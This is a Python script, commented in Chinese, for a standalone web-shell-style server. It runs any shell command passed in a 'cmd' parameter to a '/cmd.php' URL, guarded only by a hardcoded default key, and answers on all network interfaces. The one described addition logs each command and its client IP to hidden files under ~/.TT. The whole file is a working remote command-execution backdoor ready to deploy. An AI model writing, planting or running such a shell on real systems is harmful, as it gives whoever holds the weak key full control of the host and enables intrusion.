#!/usr/bin/env python3
# cmdserver.py — 单文件 HTTP 命令执行服务（原版 + 命令收录）
#
# 用法与原来完全一致:
#   python3 cmdserver.py [port] [key]
#   http://<IP>:<port>/cmd.php?key=fyctt123&cmd=whoami
#
# 新增(本地文件, 不影响访问方式):
#   ~/.TT/<会话>.txt   每行 = [时间] [来源IP] 转义后的命令
#   只记命令本身, 不记输出/报错/超时
#   TT_IDLE=秒 (默认1800) 空闲多久换新会话文件
import os
import re
import sys
import time
import threading
import subprocess
import urllib.parse
from datetime import datetime
from pathlib import Path
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
KEY  = sys.argv[2] if len(sys.argv) > 2 else "fyctt123"
TIMEOUT = 30  # 秒

HISTORY_DIR = Path.home() / ".TT"
try:
    TT_IDLE = int(os.environ.get("TT_IDLE", "1800"))
except ValueError:
    TT_IDLE = 1800

# ---------------- 转义 ----------------
def escape_for_log(s: str) -> str:
    """命令 -> 可安全写入单行的转义形式。
       字面 \\\\ -> \\\\\\\\ ; 真换行 -> \\\\n ; 真回车 -> \\\\r ;
       真制表 -> \\\\t ; 其他控制符 -> \\\\xHH ; 其余原样。
    """
    out = []
    for ch in s:
        o = ord(ch)
        if ch == "\\":   out.append("\\\\")
        elif ch == "\n": out.append("\\n")
        elif ch == "\r": out.append("\\r")
        elif ch == "\t": out.append("\\t")
        elif o < 0x20 or o == 0x7F: out.append("\\x%02x" % o)
        else: out.append(ch)
    return "".join(out)

# ---------------- 命令归档 ----------------
_hist_lock = threading.Lock()
_hist = {"fh": None, "last": 0.0}


def _open_history_file():
    HISTORY_DIR.mkdir(mode=0o700, parents=True, exist_ok=True)
    base = datetime.now().strftime("%Y%m%d_%H%M%S")
    p = HISTORY_DIR / f"{base}.txt"
    i = 1
    while p.exists():
        p = HISTORY_DIR / f"{base}_{i}.txt"
        i += 1
    fd = os.open(p, os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)
    fh = os.fdopen(fd, "a", encoding="utf-8")
    fh.write(f"# session {p.stem} | start {datetime.now().isoformat(timespec='seconds')}\n")
    fh.flush()
    try:
        os.fsync(fh.fileno())
    except OSError:
        pass
    _hist["fh"] = fh
    _hist["last"] = time.time()
    return fh


def record_command(cmd: str, client: str) -> None:
    """只收录命令本身(转义后)，不收录任何执行过程/输出。"""
    if not cmd or not cmd.strip():
        return
    line = escape_for_log(cmd)

    with _hist_lock:
        now = time.time()
        if _hist["fh"] is None or (now - _hist["last"] > TT_IDLE):
            if _hist["fh"] is not None:
                try:
                    _hist["fh"].close()
                except Exception:
                    pass
            _open_history_file()

        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        fh = _hist["fh"]
        fh.write(f"[{ts}] [{client}] {line}\n")
        fh.flush()
        try:
            os.fsync(fh.fileno())
        except OSError:
            pass
        _hist["last"] = now


def close_history() -> None:
    with _hist_lock:
        if _hist["fh"] is not None:
            try:
                _hist["fh"].close()
            except Exception:
                pass
            _hist["fh"] = None


# ---------------- HTTP 服务(与原来一致) ----------------
class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        sys.stderr.write("[%s] %s\n" % (self.address_string(), fmt % args))

    def _send(self, code: int, body: bytes, ctype="text/plain; charset=utf-8"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path != "/cmd.php":
            self._send(404, b"not found")
            return

        q = urllib.parse.parse_qs(parsed.query)
        if q.get("key", [""])[0] != KEY:
            self._send(403, b"denied")
            return

        cmd = q.get("cmd", [""])[0]
        if not cmd:
            self._send(200, b"ready")
            return

        # ↓↓↓ 唯一新增：执行前先把命令本身收录 ↓↓↓
        try:
            record_command(cmd, self.client_address[0])
        except Exception as e:
            sys.stderr.write(f"[history] record failed: {e}\n")
        # ↑↑↑ 其余逻辑、返回内容与原版完全一致 ↑↑↑

        try:
            proc = subprocess.run(cmd, shell=True, capture_output=True, timeout=TIMEOUT)
            out = proc.stdout + proc.stderr
            if not out:
                out = f"[exit {proc.returncode}]".encode()
        except subprocess.TimeoutExpired:
            out = f"[timeout {TIMEOUT}s]".encode()
        except Exception as e:
            out = f"[err] {e}".encode()

        self._send(200, out)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode(errors="replace")
        if self.path == "/cmd.php":
            self.path = "/cmd.php?" + body
        self.do_GET()


def main():
    srv = ThreadingHTTPServer(("0.0.0.0", PORT), Handler)
    print(f"listening on 0.0.0.0:{PORT}  key={KEY}")
    print(f"history  : {HISTORY_DIR}  (idle rotate {TT_IDLE}s)")
    print(f"try: http://127.0.0.1:{PORT}/cmd.php?key={KEY}&cmd=id")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\nshutting down")
        srv.shutdown()
    finally:
        close_history()


if __name__ == "__main__":
    main()